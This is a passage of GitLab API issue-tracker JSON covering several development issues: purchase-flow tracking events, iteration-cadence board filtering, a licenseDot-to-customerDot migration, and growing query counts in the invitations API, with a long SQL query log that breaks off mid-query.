Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":201566,"username":"annabeldunstone","name":"Annabel Dunstone Gray","state":"active","avatar_url":"https://secure.gravatar.com/avatar/85c0203926134720f9a9aa8c6e264c78?s=80\u0026d=identicon","web_url":"https://gitlab.com/annabeldunstone"}],"author":{"id":201566,"username":"annabeldunstone","name":"Annabel Dunstone Gray","state":"active","avatar_url":"https://secure.gravatar.com/avatar/85c0203926134720f9a9aa8c6e264c78?s=80\u0026d=identicon","web_url":"https://gitlab.com/annabeldunstone"},"type":"ISSUE","assignee":{"id":201566,"username":"annabeldunstone","name":"Annabel Dunstone Gray","state":"active","avatar_url":"https://secure.gravatar.com/avatar/85c0203926134720f9a9aa8c6e264c78?s=80\u0026d=identicon","web_url":"https://gitlab.com/annabeldunstone"},"user_notes_count":78,"merge_requests_count":0,"upvotes":5,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354055","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":8,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354055","notes":"https://gitlab.com/api/v4/projects/278964/issues/354055/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354055/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354055","relative":"#354055","full":"gitlab-org/gitlab#354055"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":9577,"epic":{"id":695078,"iid":9577,"title":"Review Rounds","url":"/groups/gitlab-org/-/epics/9577","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":103917054,"iid":354049,"project_id":278964,"title":"Tracking Additions to Gitlab.com New Subscription purchase flow - /billing page viewed route","description":"\u003c!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.--\u003e\n\n### Proposal\n\nWe'd like to add a few addition events to our Gitlab.com New subscription purchase flow to help complete our view and understanding of users' activity throughout the funnel.\n\nAdditional tracking events include:\n\n* SaaS Checkout flow start backend event (BE)\n* Confirm purchase CTA button click (FE)\n* Purchase confirmation banner view (BE)\n\n### Tracking details \n\n- [json schema](https://gitlab.com/gitlab-org/iglu/-/blob/master/public/schemas/com.gitlab/gitlab_experiment/jsonschema/0-3-0) used in `gitlab-experiment` tracking.\n- see [taxonomy](https://docs.gitlab.com/ee/development/snowplow/index.html#structured-event-taxonomy) for a guide.\n\n| activity | category | action | label | context | property | value | dimensions | \n| -------- | ------ | ----- | ------- | -------- | ----- | -------- | ----- |\n| Viewed checkout screen (first screen that renders actual checkout for a particular namespace) | subscriptions:new | render | saas_checkout | | | | pass `namespace_id` and `datetime` that the events occurred |\n| confirm purchase CTA button clicked | `default` | click_button | confirm_purchase | pass value of `Success: subscription` or \\[failure reason\\]|  |  | pass `namespace_id` and `datetime` that the events occurred |\n| purchase confirmation banner rendered on group page after SaaS purchase is completed |  groups:show | render | purchase_confirmation_banner_displayed |  | | | pass `namespace_id` and `datetime` that the events occurred |\n\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2022-03-01T20:34:33.730Z","updated_at":"2022-04-18T07:04:21.461Z","closed_at":"2022-04-12T13:09:07.040Z","closed_by":{"id":10216431,"username":"syarynovskyi","name":"Serhii Yarynovskyi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10216431/avatar.png","web_url":"https://gitlab.com/syarynovskyi"},"labels":["DEPRECATED Growth-Deliverable","Deliverable","devops::growth","feature::addition","group::acquisition","section::growth","type::feature","workflow::ready for review"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":9347704,"username":"gdoud","name":"Gayle Doud","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9347704/avatar.png","web_url":"https://gitlab.com/gdoud"},{"id":10216431,"username":"syarynovskyi","name":"Serhii Yarynovskyi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10216431/avatar.png","web_url":"https://gitlab.com/syarynovskyi"}],"author":{"id":9347704,"username":"gdoud","name":"Gayle Doud","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9347704/avatar.png","web_url":"https://gitlab.com/gdoud"},"type":"ISSUE","assignee":{"id":9347704,"username":"gdoud","name":"Gayle Doud","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9347704/avatar.png","web_url":"https://gitlab.com/gdoud"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354049","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354049","notes":"https://gitlab.com/api/v4/projects/278964/issues/354049/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354049/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354049","relative":"#354049","full":"gitlab-org/gitlab#354049"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103913252,"iid":354041,"project_id":278964,"title":"Issue boards: add ability to filter by iteration cadence","description":"We currently have the ability to filter by iterations. When `:iteration_cadences` are turned on, autocomplete of the iteration token will group them by cadences, but we will still not have the ability to filter by a cadence (include all issues from open iterations within a cadence).\n\nI believe we support this within boards on the backend (`BoardIssueInput.iterationCadenceId`) but not within project or group issue search.","state":"closed","created_at":"2022-03-01T18:50:32.709Z","updated_at":"2022-04-18T07:00:48.339Z","closed_at":"2022-04-12T17:56:04.617Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["Deliverable","GraphQL","UX","auto updated","backend","devops::plan","documentation","frontend","group::project management","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"}],"author":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"type":"ISSUE","assignee":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"user_notes_count":13,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354041","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354041","notes":"https://gitlab.com/api/v4/projects/278964/issues/354041/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354041/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354041","relative":"#354041","full":"gitlab-org/gitlab#354041"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":45530,"iid":57,"sequence":12,"group_id":9970,"title":"Iteration 12","description":null,"state":3,"created_at":"2022-01-18T00:05:01.890Z","updated_at":"2022-04-13T00:05:02.156Z","start_date":"2022-03-30","due_date":"2022-04-12","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/45530"},"health_status":null},{"id":103909645,"iid":354025,"project_id":278964,"title":"Version-App: Change from licenseDot to customerDot","description":"As licenseDot is now deprecated and we should use [customers.gitlab.com](customers.gitlab.com) we need to change the way we retrieve [license information in version-app](https://gitlab.com/gitlab-services/version-gitlab-com/-/blob/master/app/services/license_app_service.rb).\n\nCurrently we [receive errors](https://sentry.gitlab.net/gitlab/versiongitlabcom/issues/3209409/?referrer=slack) for a non-matching SSL certificate as license.gitlab.com is deprecated. \n\n## TODO\n\n- [x] Make sure the `/licenses` endpoint we used for licenseDot endpoint also works for customers.gitlab.com\n- [x] Introduce API endpoint at CustemersDot to provide all licenseDot features \n- [x] If above works: Change `application.secrets.license_app_url` to `customers.gitlab.com`\n- [x] Change `secrets.license_app_user_email` and `secrets.license_app_user_token` to be accepted by `customers.gitlab.com`\n- [ ] Figure out what we can do for license data we couldn't fetch and how to refetch them\n- [ ] If the data already got exported: Make sure we can re-export it again\n- [ ] Check with the data team if they are able to import data again and override","state":"closed","created_at":"2022-03-01T17:10:00.954Z","updated_at":"2022-04-11T08:26:12.095Z","closed_at":"2022-04-11T08:26:12.077Z","closed_by":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"labels":["Unplanned","devops::growth","group::product intelligence","missed:14.9","priority::1","section::growth","severity::2","type::bug","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"}],"author":{"id":3509693,"username":"nicolasdular","name":"Nicolas Dular","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c4a21f15150c12ddf13fd848597cddd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/nicolasdular"},"type":"ISSUE","assignee":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"user_notes_count":32,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354025","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":7,"completed_count":4},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 7 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354025","notes":"https://gitlab.com/api/v4/projects/278964/issues/354025/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354025/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354025","relative":"#354025","full":"gitlab-org/gitlab#354025"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103906704,"iid":354016,"project_id":278964,"title":"Resolve growing query with more invites","description":"## Problem\n\nAdding members through the `members` or `invitations` API causes what would be similar to a `n+1` query state.\n\nFor example every new email adds 12 queries - meaning we have something like an n+1 here, but not really..\n\nIt is more like queries are being performed for each member that is being added that perhaps could\nbe done from a higher level and passed in via dependency injection instead or some other method to reduce queries in those services or at the model layer during validation.\n\nThis can lead to DB saturation similar to what was seen in https://gitlab.com/gitlab-com/gl-infra/production/-/issues/6351\n\nObserved from the `invitations` API, the projects limit to where it goes over 100 seems to be 6, and group member is 8 emails.\n\n### Queries observed\n\n\u003cdetails\u003e\u003csummary\u003eFor a Project from invitations API spec\u003c/summary\u003e\n\n```console\n       0: SELECT \"personal_access_tokens\".* FROM \"personal_access_tokens\" WHERE \"personal_access_tokens\".\"token_digest\" = 'YoB+mw4POd9XtrZk4TPLJqyd3bk7OSDuxYguA39HDo4=' LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       1: SELECT \"licenses\".* FROM \"licenses\" ORDER BY \"licenses\".\"id\" DESC LIMIT 100 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       2: UPDATE \"personal_access_tokens\" SET \"last_used_at\" = '2022-03-01 16:06:45.022572' WHERE \"personal_access_tokens\".\"id\" = 180 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       3: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 736 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       4: SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"pending_delete\" = FALSE AND \"projects\".\"hidden\" = FALSE AND \"projects\".\"id\" = 99 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       5: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       6: SELECT MAX(\"project_authorizations\".\"access_level\") AS maximum_access_level, \"project_authorizations\".\"user_id\" AS project_authorizations_user_id FROM \"project_authorizations\" WHERE \"project_authorizations\".\"project_id\" = 99 AND \"project_authorizations\".\"user_id\" = 736 GROUP BY \"project_authorizations\".\"user_id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       7: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       8: SELECT \"gitlab_subscriptions\".* FROM \"gitlab_subscriptions\" WHERE \"gitlab_subscriptions\".\"namespace_id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       9: SELECT a.attname\n         FROM (\n                SELECT indrelid, indkey, generate_subscripts(indkey, 1) idx\n                  FROM pg_index\n                 WHERE indrelid = '\"gitlab_subscriptions\"'::regclass\n                   AND indisprimary\n              ) i\n         JOIN pg_attribute a\n           ON a.attrelid = i.indrelid\n          AND a.attnum = i.indkey[i.idx]\n        ORDER BY i.idx\n\n       10: SELECT a.attname, format_type(a.atttypid, a.atttypmod),\n              pg_get_expr(d.adbin, d.adrelid), a.attnotnull, a.atttypid, a.atttypmod,\n              c.collname, col_description(a.attrelid, a.attnum) AS comment\n         FROM pg_attribute a\n         LEFT JOIN pg_attrdef d ON a.attrelid = d.adrelid AND a.attnum = d.adnum\n         LEFT JOIN pg_type t ON a.atttypid = t.oid\n         LEFT JOIN pg_collation c ON a.attcollation = c.oid AND a.attcollation \u003c\u003e t.typcollation\n        WHERE a.attrelid = '\"plans\"'::regclass\n          AND a.attnum \u003e 0 AND NOT a.attisdropped\n        ORDER BY a.attnum\n\n       11: SELECT \"plans\".* FROM \"plans\" WHERE \"plans\".\"name\" = 'free' LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       12: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       13: SELECT 1 AS one FROM \"gitlab_subscriptions\" WHERE \"gitlab_subscriptions\".\"namespace_id\" = 1006 LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       14: INSERT INTO \"gitlab_subscriptions\" (\"created_at\", \"updated_at\", \"start_date\", \"namespace_id\") VALUES ('2022-03-01 16:06:45.114189', '2022-03-01 16:06:45.114189', '2022-03-01', 1006) RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       15: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       16: SELECT \"plans\".* FROM \"plans\" WHERE \"plans\".\"name\" = 'free' LIMIT 1 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       17: SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       18: SELECT a.attname\n         FROM (\n                SELECT indrelid, indkey, generate_subscripts(indkey, 1) idx\n                  FROM pg_index\n                 WHERE indrelid = '\"plans\"'::regclass\n                   AND indisprimary\n              ) i\n         JOIN pg_attribute a\n           ON a.attrelid = i.indrelid\n          AND a.attnum = i.indkey[i.idx]\n        ORDER BY i.idx\n\n       19: INSERT INTO \"plans\" (\"created_at\", \"updated_at\", \"name\") VALUES ('2022-03-01 16:06:45.130725', '2022-03-01 16:06:45.130725', 'free') RETURNING \"id\" /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       20: RELEASE SAVEPOINT active_record_2 /*application:test,correlation_id:72c6c4e2-d753-44e3-bd5a-194599c9e951,endpoint_id:POST /api/:version/projects/:id/invitations,db_config_name:main*/\n       21: SELECT a.attname, format_type(a.atttypid, a.atttypmod),\n              pg_get_expr(d.adbin, d.adrelid), a.attnotnull, a.atttypid, a.atttypmod,\n              c.collname, col_description(a.attrelid, a.attnum) AS comment\n         FROM pg_attribute a\n         LEFT JOIN pg_attrdef d ON a.attrelid = d.adrelid AND a.attnum = d.adnum\n         LEFT JOIN pg_type t ON a.atttypid = t.oid\n         LEFT JOIN pg_collation c ON a.attcollation = c.oid AND a.attcollation \u003c\u003e t.typcollation\n        WHERE a.attrelid = '\"plan_limits\"'::regclass\n          AND a.attnum \u003e 0 AND NOT a.attisdropped\n        ORDER BY a.attnum\n\n       22: SELECT \"plan_limits\".\"id\", \"plan_limits\".\"plan_id\", \"plan_limits\".\"ci_active_pipelines\", \"plan_limits\".\"ci_pipeline_size\", \"plan_limits\".\"ci_active_jobs\", \"plan_limits\".\"project_hooks\", \"plan_limits\".\"group_hooks\", \"plan_limits\".\"ci_project_subscriptions\", \"plan_limits\".\"ci_pipeline_schedules\", \"plan_limits\".\"offset_pagination_limit\", \"plan_limits\".\"ci_instance_level_variables\", \"plan_limits\".\"storage_size_limit\", \"plan_limits\".\"ci_max_artifact_size_lsif\", \"plan_limits\".\"ci_max_artifact_size_archive\", \"plan_limits\".\"ci_max_artifact_size_metadata\", \"plan_limits\".\"ci_max_artifact_size_trace\", \"plan_limits\".\"ci_max_artifact_size_junit\", \"plan_limits\".\"ci_max_artifact_size_sast\", \"plan_limits\".\"ci_max_artifact_size_dependency_scanning\", \"plan_limits\".\"ci_max_artifact_size_container_scanning\", \"plan_limits\".\"ci_max_artifact_size_dast\", \"plan_limits\".\"ci_max_artifact_size_codequality\", \"plan_limits\".\"ci_max_artifact_size_license_management\", \"plan_limits\".\"ci_max_artifact_size_license_scanning\", \"plan_limits\".\"ci_max_artifact_size_performance\", \"plan_limits\".\"ci_max_artifact_size_metrics\", \"plan_limits\".\"ci_max_artifact_size_metrics_referee\", \"plan_limits\".\"ci_max_artifact_size_network_referee\", \"plan_limits\".\"ci_max_artifact_size_dotenv\", \"plan_limits\".\"ci_max_artifact_size_cobertura\", \"plan_limits\".\"ci_max_artifact_size_terraform\", \"plan_limits\".\"ci_max_artifact_size_accessibility\", \"plan_limits\".\"ci_max_artifact_size_cluster_applications\", \"plan_limits\".\"ci_max_artifact_size_secret_detection\", \"plan_limits\".\"ci_max_artifact_size_requirements\", \"plan_limits\".\"ci_max_artifact_size_coverage_fuzzing\", \"plan_limits\".\"ci_max_artifact_size_browser_performance\", \"plan_limits\".\"ci_max_artifact_size_load_performance\", \"plan_limits\".\"ci_needs_size_limit\", \"plan_limits\".\"conan_max_file_size\", \"plan_limits\".\"maven_max_file_size\", \"plan_limits\".\"npm_max_file_size\", \"plan_limits\".\"nuget_max_file_size\", \"plan_limits\".\"pypi_max_file_size\", \"plan_limits\".\"generic_packages_max_file_size\", \"plan_limits\".\"golang_max_file_size\", \"plan_limits\".\"debian_max_file_size\", \"plan_limits\".\"project_feature_flags\", \"plan_limits\".\"ci_max_artifact_size_api_fuzzing\", \"plan_limits\".\"ci_pipeline_deployments\", \"plan_limits\".\"pull_mirror_interval_seconds\", \"plan_limits\".\"daily_invites\", \"plan_limits\".\"rubygems_max_file_size\", \"plan_limits\".\"terraform_module_max_file_size\", \"plan_limits\".\"helm_max_file_size\", \"plan_limits\".\"ci_registered_group_runners\", \"plan_limits\".\"ci_registered_project_runners\", 